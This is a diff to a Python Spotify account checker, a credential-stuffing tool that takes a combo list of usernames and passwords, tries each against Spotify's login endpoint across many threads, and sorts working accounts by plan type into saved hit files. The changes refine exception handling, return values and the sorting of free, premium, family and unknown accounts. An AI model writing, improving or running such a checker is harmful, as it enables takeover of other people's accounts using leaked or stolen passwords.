@@ -3,11 +3,11 @@ from tkinter.filedialog import askopenfilename
 from tkinter import Tk
 try:
     import requests
-except:
+except ModuleNotFoundError:
     os.system("pip install requests")
 try:
     import requests
-except:
+except ModuleNotFoundError:
     print("failed to install python requests\ntry installing that manually")
     sys.exit()
 
@@ -94,7 +94,7 @@ def check_account(username,password):
     session = requests.session()
     try:
         session.get("https://accounts.spotify.com/en/login/")
-    except Exception as e:
+    except Exception as exception:
         check_account(username,password)
     login_params = {'remember':'true',
         'username':username,
@@ -105,31 +105,30 @@ def check_account(username,password):
     session.cookies["remember"] = login_params.get("username")
     try:
         resp = session.post(LOGIN_API_URL, data=login_params)
-    except Exception as e:
+    except Exception as exception:
         check_account(username,password)
 
     try:
         if resp.status_code==200:
             return [0,session]
         elif resp.status_code==400:
-            return [-1,None]
+            return [-1,0]
         else:
             return [-2,resp]
     except UnboundLocalError:
-        print("rec")
         check_account(username,password)
 
 def check_info(login_session):
     resp = login_session.get("https://www.spotify.com/us/account/subscription/")
     if resp.text.count("Spotify Free"):
-        return ["free",None]
+        return ["free",0]
+    elif resp.text.count("You're a member of a family plan"):
+        return ["familyMember",0]
     try:
         renew_date = re.findall("\d{1,3}\/\d{1,3}\/\d{1,3}",resp.text)[0]
-    except:
-        renew_date = None
-    if resp.text.count("You're a member of a family plan"):
-        return ["familyMember",None]
-    elif resp.text.count("Premium for Family"):
+    except IndexError:
+        renew_date = 0
+    if resp.text.count("Premium for Family"):
         return ["familyOwner",renew_date]
     elif resp.text.count("Spotify Premium"):
         return ["premium",renew_date]
@@ -149,10 +148,10 @@ def Intro():
 """)
 
 def ask_threads():
-    print("How many threads?(default is 10)",end='')
+    print("How many threads?(default is 10)",end="\r")
     try:
         return int(input())
-    except:
+    except ValueError:
         return 10
 
 def ask_combo():
@@ -188,29 +187,29 @@ def threadhandler(comboID):
         if stat==-1:
             global BAD_COUNT 
             BAD_COUNT += 1
+        elif stat==-2:
+            global UNK
+            UNK.append(data)
+            savedata("unk",data) 
         elif stat==0:
             plan , renew_date = check_info(session)
-            if "str" in str(type(plan)):
-                if plan=="free":
-                    global GOOD_FREE
-                    GOOD_FREE.append(data)
-                    savedata("free",data)
-                elif plan=="premium":
-                    global GOOD_PREMIUM
-                    GOOD_PREMIUM.append(data)
-                    savedata("premium",data,renew_date)
-                elif plan=="familyOwner":
-                    global GOOD_FAMILY_OWNER
-                    GOOD_FAMILY_OWNER.append(data)
-                    savedata("owner",data,renew_date)
-                elif plan=="familyMember":
-                    global GOOD_FAMILY_MEMBER
-                    GOOD_FAMILY_MEMBER.append(data)
-                    savedata("member",data)
-                else:
-                    global UNK
-                    UNK.append(data)
-                    savedata("unk",data)
+            if plan=="free":
+                global GOOD_FREE
+                GOOD_FREE.append(data)
+                savedata("free",data)
+            elif plan=="premium":
+                global GOOD_PREMIUM
+                GOOD_PREMIUM.append(data)
+                savedata("premium",data,renew_date)
+            elif plan=="familyOwner":
+                global GOOD_FAMILY_OWNER
+                GOOD_FAMILY_OWNER.append(data)
+                savedata("owner",data,renew_date)
+            elif plan=="familyMember":
+                global GOOD_FAMILY_MEMBER
+                GOOD_FAMILY_MEMBER.append(data)
+                savedata("member",data)
+
         combo[comboID].remove(data)
 
                     
